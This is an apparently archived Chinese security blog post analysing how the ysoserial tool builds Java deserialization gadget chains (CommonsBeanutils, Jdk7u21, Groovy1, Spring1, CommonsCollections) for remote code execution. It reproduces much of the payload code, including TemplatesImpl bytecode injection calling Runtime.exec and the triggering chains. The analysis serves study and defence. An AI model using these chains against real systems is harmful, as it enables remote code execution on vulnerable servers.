@@ -1,0 +1,292 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">java反序列化工具ysoserial分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">angelwhu</a> <span class="bull">·</span> <time title="2016/04/01 10:19" ui-time="" datetime="2016/04/01 10:19" class="published ng-binding ng-isolate-scope">2016/04/01 10:19</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>关于java反序列化漏洞的原理分析，基本都是在分析使用<code>Apache Commons Collections</code>这个库，造成的反序列化问题。然而，在下载老外的<strong>ysoserial</strong>工具并仔细看看后，我发现了许多值得学习的知识。</p><p>至少能学到如下内容:</p><ul><li>不同反序列化<code>payload</code>玩法</li><li>灵活运用了反射机制和动态代理机制构造POC</li></ul><p>java反序列化不仅是有<code>Apache Commons Collections</code>这样一种玩法。还有如下payload玩法:</p><ul><li><code>CommonsBeanutilsCollectionsLogging1</code>所需第三方库文件: commons-beanutils:1.9.2，commons-collections:3.1,commons-logging:1.2</li><li><code>CommonsCollections1</code>所需第三方库文件: commons-collections:3.1</li><li><code>CommonsCollections2</code>所需第三方库文件: commons-collections4:4.0</li><li><code>CommonsCollections3</code>所需第三方库文件: commons-collections:3.1(<code>CommonsCollections1</code>的变种)</li><li><code>CommonsCollections4</code>所需第三方库文件: commons-collections4:4.0(<code>CommonsCollections2</code>的变种)</li><li><code>Groovy1</code>所需第三方库文件: org.codehaus.groovy:groovy:2.3.9</li><li><code>Jdk7u21</code>所需第三方库文件: 只需JRE版本 &lt;= 1.7u21</li><li><code>Spring1</code>所需第三方库文件: spring框架所含spring-core:4.1.4.RELEASE,spring-beans:4.1.4.RELEASE</li></ul><p>上面标注了payload使用情况下所依赖的包，诸位可以在源码中看到，根据实际情况选择。</p><p>通过对该攻击代码的分析，可以学习java的一些有意思的知识。而且，里面写的java代码也很值得学习，巧妙运用了反射机制去解决问题。老外写的POC还是很精妙的。</p><h1>0x01 准备工作</h1><hr><ul><li>在github上下载<a href="https://github.com/angelwhu/ysoserial">ysoserial</a>工具。</li><li>使用maven进行编译成Eclipse项目文件，<code>mvn eclipse:eclipse</code>。要你联网下载依赖包，请耐心等待。如果卡住了，停止后再次执行该命令。</li></ul><p>导入后，可以看到里面有8个payload。其中<code>ObjectPayload</code>是定义的接口，所有的Payload需要实现这个接口的<code>getObject</code>方法。下面就开始对这些payload进行简要的分析。</p><p><img alt="" img-src="f8b53a1908370ce4eda5d3f7304532cdea5804b1.jpg"></p><h1>0x02 payload分析</h1><hr><h2>1. CommonsBeanutilsCollectionsLogging1</h2><p>该payload的要求依赖包挺多的，可能碰到的情况不会太多，但用到的技术是极好的。对这个payload执行的分析，请阅读参考资源第一个的分析文章。</p><p>这里谈谈我的理解。先直接看代码：</p><pre><code>#!java
+public Object getObject(final String command) throws Exception {
+    final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
+    // mock method name until armed
+    final BeanComparator comparator = new BeanComparator("lowestSetBit");
+
+    // create queue with numbers and basic comparator
+    final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+    // stub data for replacement later
+    queue.add(new BigInteger("1"));
+    queue.add(new BigInteger("1"));
+
+    // switch method called by comparator
+    Reflections.setFieldValue(comparator, "property", "outputProperties");
+    //Reflections.setFieldValue(comparator, "property", "newTransformer");
+    //这里由于比较器的代码，只能访问内部属性。所以选择outputProperties属性。 进而调用getOutputProperties方法。  @angelwhu
+
+    // switch contents of queue
+    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+    queueArray[0] = templates;
+    queueArray[1] = templates;
+
+    return queue;
+}
+</code></pre><p>第一行代码<code>final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);</code>创建了<code>TemplatesImpl</code>类的对象，里面封装了我们需要的命令执行代码。而且是使用<strong>字节码</strong>的形式存储在对象属性中。<br>下面就具体分析下这个对象的产生过程。</p><h3>(1) 利用TemplatesImpl类存储危险的字节码</h3><p>在产生字节码时，用到了JDK中<code>javassist</code>类。具体了解可以参考这篇博客<a href="http://www.cnblogs.com/hucn/p/3636912.html">http://www.cnblogs.com/hucn/p/3636912.html</a>。<br>下面是我编写的一个简单的样例程序，便于理解:</p><pre><code>#!java
+@Test
+public void testClassPool() throws CannotCompileException, NotFoundException, IOException
+{
+    String command = "calc";
+
+    ClassPool pool = ClassPool.getDefault();
+    pool.insertClassPath(new ClassClassPath(angelwhu.model.Point.class));
+    CtClass cc = pool.get(angelwhu.model.Point.class.getName());
+    //System.out.println(angelwhu.model.Point.class.getName());
+
+    cc.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");
+    //加入关键执行代码，生成一个静态函数。
+
+    String newClassNameString = "angelwhu.Pwner" + System.nanoTime();
+    cc.setName(newClassNameString);
+
+    CtMethod mthd = CtNewMethod.make("public static void main(String[] args) throws Exception {new " + newClassNameString + "();}", cc);
+    cc.addMethod(mthd);
+
+    cc.writeFile();
+}
+</code></pre><p>上述代码首先获取到class定义的容器<code>ClassPool</code>，并找到了我自定义的<code>Point</code>类，由此生成了<code>cc</code>对象。这样就可以开始对类进行修改的任意操作了。而且这个操作是直接写字节码。这样可以绕过许多安全机制，正像工具中注释说的:</p><blockquote><p>// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</p></blockquote><p>后面的操作便是利用我自定义的模板类<code>Point</code>，生成新的类名，并使用<code>insertAfter</code>方法插入了恶意java代码，执行命令。有兴趣的可以再详细了解这个类的用法。这里不再赘述。</p><p>这段代码运行后，会在当前目录生成字节码(class文件)。使用<code>java</code>反编译器可看到源码，在原始模板类中插入了恶意静态代码，而且以字节码的形式直接存储。命令行直接运行，可以执行弹出计算器的命令：</p><p><img alt="" img-src="27194c9392f6a3ecb47ed3d3e6ad13a2e61cd2a9.jpg"></p><p>现在看看老外工具中，生成字节码的代码为：</p><pre><code>#!java
+public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
+    final TemplatesImpl templates = new TemplatesImpl();
+
+    // use template gadget class
+    ClassPool pool = ClassPool.getDefault();
+    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+    // run command in static initializer
+    // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+    clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");
+    // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+    clazz.setName("ysoserial.Pwner" + System.nanoTime());
+
+    final byte[] classBytes = clazz.toBytecode();
+
+    // inject class bytes into instance
+    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+        classBytes,
+        ClassFiles.classAsBytes(Foo.class)});
+
+    // required to make TemplatesImpl happy
+    Reflections.setFieldValue(templates, "_name", "Pwnr");
+    Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+    return templates;
+}  
+</code></pre><p>根据以上样例分析，可以清楚看见:前面几行代码，即生成了我们需要的<strong>插入了恶意java代码的字节码数据</strong>。该字节码其实可以看做是一个类(.class)文件。<code>final byte[] classBytes = clazz.toBytecode();</code>将其转成了二进制数据进行存储。</p><p><code>Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes,ClassFiles.classAsBytes(Foo.class)});</code>这里又来到了一个有趣知识，那就是java反射机制的强大。<code>ysoserial</code>工具封装了使用反射机制对对象的一些操作，可以直接借鉴。</p><p>具体可以看看其源码，这里在工具中经常使用的<code>Reflections.setFieldValue(final Object obj, final String fieldName, final Object value);</code>方法，便是使用反射机制，将<code>obj</code>对象的<code>fieldName</code>属性赋值为<code>value</code>。反射机制的强大之处在于：</p><ul><li>可以动态对对象的<strong>私有属性</strong>进行改变赋值，即：<code>private</code>修饰的属性。</li><li>动态生成任意类对象。</li></ul><p>于是，我们便将<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类生成的对象<code>templates</code>中的<code>_bytecodes</code>属性，<code>_name</code>属性，<code>_tfactory</code>属性赋值成我们希望的值。</p><p>重点在于<code>_bytecodes</code>属性，里面存储了我们的恶意java代码。现在的问题便是：如何触发加载我们的恶意java字节码？</p><h3>(2) 触发TemplatesImpl类加载_bytecodes属性中的字节码</h3><p>在TemplatesImpl类中存在执行链:</p><pre><code>#!java
+TemplatesImpl.getOutputProperties()
+  TemplatesImpl.newTransformer()
+    TemplatesImpl.getTransletInstance()
+      TemplatesImpl.defineTransletClasses()
+        ClassLoader.defineClass()
+        Class.newInstance()
+          ...
+            MaliciousClass.&lt;clinit&gt;()
+            //class新建初始化对象后，会执行恶意类中的静态方法，即:我们插入的恶意java代码
+              ...
+                Runtime.exec()//这里可以是任意java代码，比如:反弹shell等等。  
+</code></pre><p>这在ysoserial工具中的注释中是可以看到的。在源码中，我们从<code>TemplatesImpl.getOutputProperties()</code>开始跟踪，不难发现上面的执行链。最终会在<code>getTransletInstance</code>方法中看到如下触发加载自定义ja字节码部分的代码:</p><pre><code>#!java
+private Translet getTransletInstance()
+throws TransformerConfigurationException {
+    .............
+    if (_class == null) defineTransletClasses();//通过ClassLoader加载字节码，存储在_class数组中。
+
+    // The translet needs to keep a reference to all its auxiliary 
+    // class to prevent the GC from collecting them
+    AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//新建实例，触发恶意代码。  
+   ............
+</code></pre><p>在<code>defineTransletClasses()</code>方法中，会加载我们之前存储在<code>_bytecodes</code>属性中的字节码(可以看做类文件)，进而返回类的<code>Class</code>对象，存储在<code>_class</code>数组中。下面是调试时候的截图：</p><p><img alt="" img-src="3a1513e0c3f1a4d3bd28f530e7840b9d257c3fce.jpg"></p><p>可以看到在<code>defineTransletClasses()</code>后，得到类的<code>Class</code>对象。然后会执行<code>newInstance()</code>操作，新建一个实例，这样便触发了我们插入的静态恶意java代码。如果接着单步执行，便会弹出计算器。</p><p>通过以上分析，可以看到：</p><ul><li>只要能够自动触发<code>TemplatesImpl.getOutputProperties()</code>方法执行，我们就能达到目的了。</li></ul><h3>(3) 利用BeanComparator比较器触发执行</h3><p>我们接着看<code>payload</code>的代码：</p><pre><code>#!java
+final BeanComparator comparator = new BeanComparator("lowestSetBit");
+
+// create queue with numbers and basic comparator
+final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+// stub data for replacement later
+queue.add(new BigInteger("1"));
+queue.add(new BigInteger("1"));  
+</code></pre><p>很简单，将<code>PriorityQueue</code>(优先级队列)插入两个元素，而且需要一个实现了<code>Comparator</code>接口的比较器，对元素进行比较，并对元素进行排队处理。具体可以看看<code>PriorityQueue</code>类的<code>readObject()</code>方法。</p><pre><code>#!java
+private void readObject(java.io.ObjectInputStream s)
+    throws java.io.IOException, ClassNotFoundException {
+    ...........
+    queue = new Object[size];
+    // Read in all elements.
+    for (int i = 0; i &lt; size; i++)
+        queue[i] = s.readObject();
+    // Elements are guaranteed to be in "proper order", but the
+    // spec has never explained what that might be.
+    heapify();
+}   
+</code></pre><p>从对象反序列化过程原理，可以知道会首先调用该对象<code>readObject()</code>。当然在序列化过程中会首先调用该对象的<code>writeObject()</code>方法。这两个方法可以对比着看，方便理解。</p><p>首先，在序列化<code>PriorityQueue</code>类实例时，会依次读取队列中的对象，并放到数组中进行存储。<code>queue[i] = s.readObject();</code>然后，进行排序操作<code>heapify();</code>。最终会到达这里，调用比较器的<code>compare()</code>方法，对元素间进行比较。</p><pre><code>#!java
+private void siftDownUsingComparator(int k, E x) {
+    .........................
+        if (comparator.compare(x, (E) c) &lt;= 0)
+            break;
+    .........................
+
+}
+</code></pre><p>这里传进去的，便是<code>BeanComparator</code>比较器：位于<code>commons-beanutils</code>包。<br>于是，看看比较器的<code>compare</code>方法。</p><pre><code>#!java
+public int compare( T o1, T o2 ) {
+        ..................
+        Object value1 = PropertyUtils.getProperty( o1, property );
+        Object value2 = PropertyUtils.getProperty( o2, property );
+        return internalCompare( value1, value2 );     
+        ..................    
+}
+</code></pre><p><code>o1</code>,<code>o2</code>便是要比较的两个对象，<code>property</code>即我们需要比较对象中的属性(可控)。一开始<code>property</code>赋值为<code>lowestSetBit</code>，后来改成真正需要的<code>outputProperties</code>属性。</p><p><code>PropertyUtils.getProperty( o1, property )</code>顾名思义，便是取出<code>o1</code>对象中<code>property</code>属性的值。而实际上会去调用<code>o1.getProperty()</code>方法得到<code>property</code>属性值。</p><p>到这里，可以画上完美的一个圈了。我们只需将前面构造好的<code>TemplatesImpl</code>对象添加到<code>PriorityQueue</code>(优先级队列)中，然后设置比较器为<code>BeanComparator("outputProperties")</code>即可。<br>那么，在反序列化过程中，会自动调用<code>TemplatesImpl.getOutputProperties()</code>方法。执行命令了。</p><p>个人总结观点：</p><ul><li>只需要想办法：自动调用<code>TemplatesImpl</code>的<code>getOutputProperties</code>方法。或者<code>TemplatesImpl.newTransformer()</code>即能自动加载字节码，触发恶意代码。这也在其他<code>payload</code>中经常用到。</li><li>触发原理：提供会自动调用比较器的容器。如:将<code>PriorityQueue</code>换成<code>TreeSet</code>容器，也是可以的。</li></ul><p>为了在生成payload时，能够正常运行。在代码中，先象征性地加入了两个<code>BigInteger</code>对象。<br>后面使用反射机制，将<code>comparator</code>中的属性和<code>queue</code>容器存储的对象都改成我们需要的属性和对象。<br>否则，在生成<code>payload</code>时，便会弹出计算器，抛出异常，无法正常执行了。测试如下:</p><p><img alt="" img-src="5bb388414ddbc411908e8a11660dd237b53f0541.jpg"></p><h2>2. Jdk7u21</h2><p>该<code>payload</code>其实是<code>JAVA SE</code>的一个漏洞，ysoserial工具注释中有链接：<a href="https://gist.github.com/frohoff/24af7913611f8406eaf3">https://gist.github.com/frohoff/24af7913611f8406eaf3</a>。该<code>payload</code>不需要使用任何第三方库文件，只需官方提供的<code>JDK</code>即可，这个很方便啊。 不知<code>Jdk7u21</code>以后怎么补的，先来看看它的实现。</p><p>在介绍完上面这个<code>payload</code>后，再来看这个可以发现：<code>CommonsBeanutilsCollectionsLogging1</code>借鉴了<code>Jdk7u21</code>的利用方法。</p><p>同样，<code>Jdk7u21</code>开始便创建了一个存储了恶意java字节码数据的<code>TemplatesImpl</code>类对象。接下来就是怎么触发的问题了：如何自动触发<code>TemplatesImpl</code>的<code>getOutputProperties</code>方法。</p><p>这里首先就有一个有趣的hash碰撞问题了。</p><h3>(1) "f5a5a608"的hash值为0</h3><p>类的<code>hashCode</code>方法是返回一个独一无二的hash值(int型)，去代表这个唯一对象。如果类没有重写<code>hashCode</code>方法，会调用原始<code>Object</code>类中的<code>hashCode</code>方法返回一个hash值。<br><code>String</code>类的<code>hashCode</code>方法是这么实现的。</p><pre><code>#!java    
+public int hashCode() {
+    int h = hash;
+    int len = count;
+    if (h == 0 &amp;&amp; len &gt; 0) 
+    {
+        int off = offset;
+        char val[] = value;
+        for (int i = 0; i &lt; len; i++) {
+            h = 31*h + val[off++];
+        }
+        hash = h;
+    }
+    return h;
+}
+</code></pre><p>于是，就有了有趣的值:</p><pre><code>#!java
+String zeroHashCodeStr = "f5a5a608";
+int hash3 = zeroHashCodeStr.hashCode();
+System.out.println(hash3);
+</code></pre><p>可以看到"f5a5a608"字符串，通过<code>hashCode</code>方法生成的hash值为0。这在之后的触发过程中会用到。</p><h3>(2) 利用动态代理机制触发执行</h3><p><code>Jdk7u21</code>中使用了<code>HashSet</code>容器进行触发。添加了两个对象，一个是存储了恶意java字节码数据的<code>TemplatesImpl</code>类对象<code>templates</code>,一个是代理了<code>Templates</code>接口的<code>proxy</code>对象，使用了动态代理机制。</p><p>如下是<code>Jdk7u21</code>生成payload时的主要代码：</p><pre><code>#!java
+......
+InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+......
+LinkedHashSet set = new LinkedHashSet(); // maintain order
+set.add(templates);
+set.add(proxy);
+......
+return set;
+</code></pre><p><code>HashSet</code>容器，就可以当做是一个<code>HashMap&lt;key,new Object()&gt;</code>，<code>key</code>便是我们存储进去的数据，对应的<code>value</code>都只是静态的<code>Object</code>对象。</p><p>同样，来看看<code>HashSet</code>容器中的<code>readObject</code>方法。</p><pre><code>#!java
+private void readObject(java.io.ObjectInputStream s)
+    throws java.io.IOException, ClassNotFoundException {
+
+....................
+// Read in all elements in the proper order.
+    for (int i=0; i&lt;size; i++) {
+        E e = (E) s.readObject();
+        map.put(e, PRESENT);
+    }//添加set数据
+}
+</code></pre><p>实际上，这里<code>map</code>可以看做是<code>HashMap</code>类生成的对象。接着追踪源码就到了关键的地方:</p><pre><code>#!java
+public V put(K key, V value) {
+    .........
+    int hash = hash(key.hashCode());
+    int i = indexFor(hash, table.length);
+    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
+        Object k;
+        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {//此处逻辑，需要使其触发key.equals(k)操作。
+            ..........
+        }
+    }
+    .........
+}
+</code></pre><p>通过以上分析下可以知道：在反序列化<code>HashSet</code>过程中，会依次将<code>templates</code>和<code>proxy</code>对象添加到<code>map</code>中。</p><p>接着我们需要触发代码去执行<code>key.equals(k)</code>这条语句。<br>由于<strong>短路机制</strong>的原因，必须使<code>templates.hashCode()</code>与<code>proxy.hashCode()</code>计算值相等。</p><p><code>proxy</code>使用了<strong>动态代理</strong>机制，代理了<code>Templates</code>接口。具体请参考其他分析老外<code>LazyMap</code>触发<code>Apache Commons Collections</code>第三库序列化问题的文章，如：参考资料2。</p><p>这里又到了熟悉的<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类。<br>简而言之，我理解为将对象<code>proxy</code>所有的方法调用，都改成调用<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类的<code>invoke()</code>方法。</p><p>当我们调用<code>proxy.hashCode()</code>方法时，自然就会执行到了如下代码:</p><pre><code>#!java
+public Object invoke(Object proxy, Method method, Object[] args) {
+    String member = method.getName();
+    ............
+    if (member.equals("hashCode"))
+        return hashCodeImpl();
+        ..........
+
+private int hashCodeImpl() {
+    int result = 0;
+    for (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) {
+        result += (127 * e.getKey().hashCode()) ^//使e.geyKey().hashCode()为0。"f5a5a608".hashCode()=0;
+            memberValueHashCode(e.getValue());
+    }
+    return result;
+}
+</code></pre><p>这里的<code>memberValues</code>就是<code>payload</code>代码一开始传进去的<code>map("f5a5a608",templates)</code>。简要画图说明为:</p><p><img alt="" img-src="22eb054ffce356634d7f51fca9c4bef28a7a6902.jpg"></p><p>因此，通过动态代理机制加上<code>"f5a5a608".hashCode()=0</code>的特殊性，使<code>e.hash == hash</code>成立。<br>这样便可以执行<code>key.equals(k)</code>，即：<code>proxy.equals(templates)</code>语句。</p><p>接着查看源码便知：<code>proxy.equals(templates)</code>操作会遍历<code>Templates</code>接口的所有方法，并调用。如此，即可触发调用<code>templates</code>的<code>getOutputProperties</code>方法。</p><pre><code>#!java
+if (member.equals("equals") &amp;&amp; paramTypes.length == 1 &amp;&amp;
+        paramTypes[0] == Object.class)
+        return equalsImpl(args[0]);
+
+..........................
+ private Boolean equalsImpl(Object o) {
+..........................
+    for (Method memberMethod : getMemberMethods()) {
+        String member = memberMethod.getName();
+        Object ourValue = memberValues.get(member);
+..........................
+                hisValue = memberMethod.invoke(o);//触发调用getOutputProperties方法
+</code></pre><p>如此，<code>Jdk7u21</code>的<code>payload</code>便也完美触发了。</p><p>同样，为了正常生成payload不抛出异常。先暂时存储<code>map.put(zeroHashCodeStr, "foo");</code>，后面替换为真正我们所需的对象：<code>map.put(zeroHashCodeStr, templates); // swap in real object</code></p><p>总结一下：</p><ul><li>技术关键在于巧妙的利用了"f5a5a608"hash值为0。实现了hash碰撞成立。</li><li><code>AnnotationInvocationHandler</code>对于<code>equal</code>方法的处理，可以使我们调用目标方法<code>getOutputProperties</code>。</li></ul><p>计算hash值部分的内容还挺有意思。有兴趣可以到参考链接中github上看看我的测试代码。</p><h2>3. Groovy1</h2><p>这个<code>payload</code>和最近<code>Xstream</code>反序列化漏洞的POC原理有相似性。请参考：<a href="http://drops.wooyun.org/papers/13243" title="http://drops.wooyun.org/papers/13243">http://drops.wooyun.org/papers/13243</a>。</p><p>下面谈谈这个payload不一样的地方。 <code>payload</code>使用了<code>Groovy</code>库中<code>ConvertedClosure</code>类。该类实现了<code>InvocationHandler</code>和<code>Serializable</code>接口，同样可以用作动态代理并且可以序列化传输。代码也只有几行：</p><pre><code>#!java
+final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
+final Map map = Gadgets.createProxy(closure, Map.class);        
+final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
+return handler;
+</code></pre><p>当反序列化handler时，会调用<code>map.entrySet</code>方法。于是，就调用代理类<code>ConvertedClosure</code>的<code>invoke</code>方法了。最终，来到了:</p><pre><code>#!java
+public Object invokeCustom(Object proxy, Method method, Object[] args)
+throws Throwable {
+    if (methodName!=null &amp;&amp; !methodName.equals(method.getName())) return null;
+    return ((Closure) getDelegate()).call(args);//传入的是MethodClosure
+}  
+</code></pre><p>然后和<code>XStream</code>一样，调用<code>MethodClosure.doCall()</code>方法。即：Groovy语法中<code>"command".execute()</code>，顺利执行命令。</p><p>个人总结：</p><ul><li>可以看到动态代理机制的强大作用。</li></ul><h2>4. Spring1</h2><p><code>Spring1</code>这个<code>payload</code>执行链有些复杂。按照常规步骤来分析下：</p><ul><li><p>反序列化对象的readObject()方法为入口点进行跟踪。这里是<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code>。</p><pre><code>#!java
+private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
+    inputStream.defaultReadObject();
+    Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);
+    this.result = ReflectionUtils.invokeMethod(method, this.provider.getType());
+}
+</code></pre></li></ul><p>很明显的嗅到了感兴趣的"味道"：<code>ReflectionUtils.invokeMethod</code>。接下来联系<code>payload</code>源码跟进下，或者单步调试。</p><ul><li>由于流程可能比较错综复杂，画个简单的图表示下几个对象之间的关系:</li></ul><p><img alt="" img-src="d09da8c500f88d44a1acdf30dd1d831623fd438e.jpg"></p><ul><li><p>在执行<code>ReflectionUtils.invokeMethod(method, this.provider.getType())</code>语句时，整个执行流程如下：</p><pre><code>#!java
+ReflectionUtils.invokeMethod()
+    Method.invoke(typeTemplatesProxy对象)    
+    //Method为Templates(Proxy).newTransformer()
+</code></pre></li></ul><p>这是明显的一部分调用，在执行<code>Templates(Proxy).newTransformer()</code>时，会有余下过程发生：</p><pre><code>#!java        
+typeTemplatesProxy对象.invoke() 
+    method.invoke(objectFactoryProxy对象.getObject(), args);
+        objectFactoryProxy对象.getObject()
+            AnnotationInvocationHandler.invoke()
+                HashMap.get("getObject")//返回templates对象    
+    Method.invoke(templates对象,args)
+        TemplatesImpl.newTransformer()
+        .......//触发加载含有恶意java字节码的操作
+</code></pre><p>这里面是对象之间的调用，还有动态代理机制，容易绕晕，就说到这里。有兴趣可以单步调试看看。</p><p>个人总结：</p><ul><li><code>Spring1</code>为了强行代理<code>Type</code>接口，进行对象赋值。运用了多个动态代理机制实现，还是很巧妙的。</li></ul><h2>5. CommonsCollections</h2><p>对<code>CommonsCollections</code>类，<code>ysoserial</code>工具中存在四种利用方法。所用的方法都是与上面几个<code>payload</code>类似。</p><ul><li><code>CommonsCollections1</code>自然是使用了<code>LazyMap</code>和动态代理机制进行触发调用<code>Transformer</code>执行链，请<a href="http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/">参考链接2</a>。</li><li><p><code>CommonsCollections2</code>和<code>CommonsBeanutilsCollectionsLogging1</code>一样也使用了比较器去触发<code>TemplatesImpl</code>的<code>newTransformer</code>方法执行命令。<br>这里用到的比较器为<code>TransformingComparator</code>,直接看其<code>compare</code>方法：</p><pre><code>#!java
+public int compare(final I obj1, final I obj2) {
+    final O value1 = this.transformer.transform(obj1);
+    final O value2 = this.transformer.transform(obj2);
+    return this.decorated.compare(value1, value2);
+}
+</code></pre></li></ul><p>很直接调用了<code>transformer.transform(obj1)</code>，这里的<code>obj1</code>就是<code>payload</code>中的<code>templates</code>对象。<br>主要代码为：</p><pre><code>#!java
+// mock method name until armed
+final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+
+// create queue with numbers and basic comparator
+final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));     
+.........
+// switch method called by comparator
+Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
+//使用反射机制改变私有变量~ 不然，会在之前就执行命令，无法生成序列化数据。
+//反序列化时，会调用TemplatesImpl的newTransformer方法。 
+</code></pre><p>根据熟悉的<code>InvokerTransformer</code>作用，最终会调用<code>templates.newTransformer()</code>执行恶意java代码。</p><ul><li><p><code>CommonsCollections3</code>是<code>CommonsCollections1</code>的变种，将执行链换了下：</p><pre><code>#!java
+TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(command);
+.............
+// real chain for after setup
+final Transformer[] transformers = new Transformer[] {
+        new ConstantTransformer(TrAXFilter.class),
+        new InstantiateTransformer(
+                new Class[] { Templates.class },
+                new Object[] { templatesImpl } )};  
+</code></pre></li></ul><p>查看<code>InstantiateTransformer</code>的<code>transform</code>方法，可以看到关键代码：</p><pre><code>#!java
+Constructor con = ((Class) input).getConstructor(iParamTypes);  //input为TrAXFilter.class
+return con.newInstance(iArgs);
+</code></pre><p>即：<code>transformer</code>执行链会执行<code>new TrAXFilter(templatesImpl)</code>。正好，<code>TrAXFilter</code>类构造函数中调用了<code>templates.newTransformer()</code>方法。都是套路啊。</p><pre><code>#!java
+public TrAXFilter(Templates templates)  throws 
+TransformerConfigurationException
+{
+    _templates = templates;
+    _transformer = (TransformerImpl) templates.newTransformer();//触发执行命令
+    _transformerHandler = new TransformerHandlerImpl(_transformer);
+    _useServicesMechanism = _transformer.useServicesMechnism();
+}
+</code></pre><ul><li><p><code>CommonsCollections4</code>是<code>CommonsCollections2</code>的变种。同样使用<code>InstantiateTransformer</code>触发<code>templates.newTransformer()</code>代替了之前的执行链。</p><pre><code>#!java
+TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
+...............
+// grab defensively copied arrays
+paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
+args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
+..............
+// swap in values to arm
+Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
+paramTypes[0] = Templates.class;
+args[0] = templates;
+...................
+</code></pre></li></ul><p>照例生成<code>PriorityQueue&lt;Object&gt; queue</code>后，使用反射机制对其属性进行修改。保证成功生成payload。</p><p>个人总结：payload分析完了，里面涉及的方法很巧妙。也有许多共同的利用特性，值得学习~~</p><h1>0x03 参考资料</h1><hr><ul><li><a href="http://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/">http://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/</a></li><li><a href="http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/" title="http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/">http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/</a></li><li><a href="https://github.com/angelwhu/ysoserial-test/" title="https://github.com/angelwhu/ysoserial-test/">https://github.com/angelwhu/ysoserial-test/</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2016-04-01 15:04:37</span></div><p></p><p>那个高版本的common collections对应的payload没用是因为国内常见中间件都用的是低版本的common collections。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Fnut</span> <span class="reply-time">2016-04-01 12:27:09</span></div><p></p><p>666向天使学习</p><p></p></div></div></div></div></div></main>
